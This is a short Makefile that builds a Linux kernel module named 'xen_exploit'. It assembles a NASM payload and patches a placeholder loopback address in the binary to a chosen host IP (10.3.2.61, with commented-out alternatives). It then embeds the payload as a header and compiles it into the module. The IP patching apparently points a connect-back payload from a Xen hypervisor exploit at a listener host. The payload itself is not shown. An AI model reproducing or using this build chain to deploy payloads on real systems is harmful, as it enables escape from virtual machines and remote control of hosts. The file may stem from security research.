TARGET = xen_exploit

KDIR = /lib/modules/$(shell uname -r)/build
obj-m += $(TARGET).o

all: payload.h
	make -C $(KDIR) M=$(PWD) modules

payload.h: payload.o
	xxd -i $^ $@

payload.o: payload.nasm
	nasm -f bin -o $@ $^
	sed -i 's/127\.000\.000\.001/10.3.2.61/' $@ #xendev2
	#sed -i 's/127\.000\.000\.001/192.168.1.11/' $@ # host2
	#sed -i 's/127\.000\.000\.001/192.168.1.10/' $@ # host1

clean:
	make -C $(KDIR) M=$(PWD) clean
	rm -rf payload.h payload.o
